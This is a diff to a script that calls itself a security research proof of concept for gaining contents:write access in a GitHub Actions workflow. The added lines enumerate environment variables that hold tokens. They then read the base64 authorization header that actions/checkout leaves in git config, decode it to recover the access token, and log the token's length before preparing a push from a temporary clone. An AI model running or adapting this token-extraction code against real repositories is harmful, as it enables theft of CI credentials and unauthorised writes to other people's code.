@@ -47,16 +47,52 @@ const fs = require('fs');
     // Stage 3: Create Proof File (separate from current checkout)
     console.log("[Stage 3] Creating Proof of contents:write");
 
-    // Get the token from github-script context (passed as input)
-    const token = process.env.INPUT_GITHUB_TOKEN || process.env.GITHUB_TOKEN;
+    // Debug: List all env vars that might contain the token
+    console.log("  [Debug] Checking environment variables...");
+    const tokenVars = Object.keys(process.env).filter(k =>
+        k.includes('TOKEN') || k.includes('GITHUB') || k.includes('INPUT')
+    );
+    console.log("  [Debug] Token-related vars:", tokenVars.join(', '));
+
+    // Get the token - try multiple sources
+    let token = process.env.INPUT_GITHUB_TOKEN ||
+                process.env.GITHUB_TOKEN ||
+                process.env['INPUT_GITHUB-TOKEN'];
+
+    // The token might be masked in logs but still usable
     if (!token) {
-        console.log("  ! No token found in environment");
+        console.log("  ! No token found in standard env vars");
+        console.log("  [Debug] Trying to read from git config...");
+
+        // Try to extract from git extraheader (set by actions/checkout)
+        try {
+            const extraHeader = execSync('git config --get http.https://github.com/.extraheader 2>/dev/null', {encoding: 'utf8'}).trim();
+            if (extraHeader && extraHeader.includes('AUTHORIZATION:')) {
+                // Extract base64 encoded token
+                const match = extraHeader.match(/AUTHORIZATION: basic (.+)/);
+                if (match) {
+                    const decoded = Buffer.from(match[1], 'base64').toString();
+                    // Format is usually x-access-token:TOKEN
+                    const tokenMatch = decoded.match(/x-access-token:(.+)/);
+                    if (tokenMatch) {
+                        token = tokenMatch[1];
+                        console.log("  ✓ Extracted token from git config");
+                    }
+                }
+            }
+        } catch (e) {
+            console.log("  ! Could not extract from git config:", e.message);
+        }
+    }
+
+    if (!token) {
+        console.log("  ! No token found - cannot proceed with push");
         console.log("");
         console.log("[Complete] Security research PoC finished (no token)");
         console.log("");
         return;
     }
-    console.log("  ✓ Token available");
+    console.log("  ✓ Token available (length:", token.length + ")");
 
     // Clone fresh copy to a temp dir to avoid workflow file issues
     const tempDir = `/tmp/poc-${Date.now()}`;
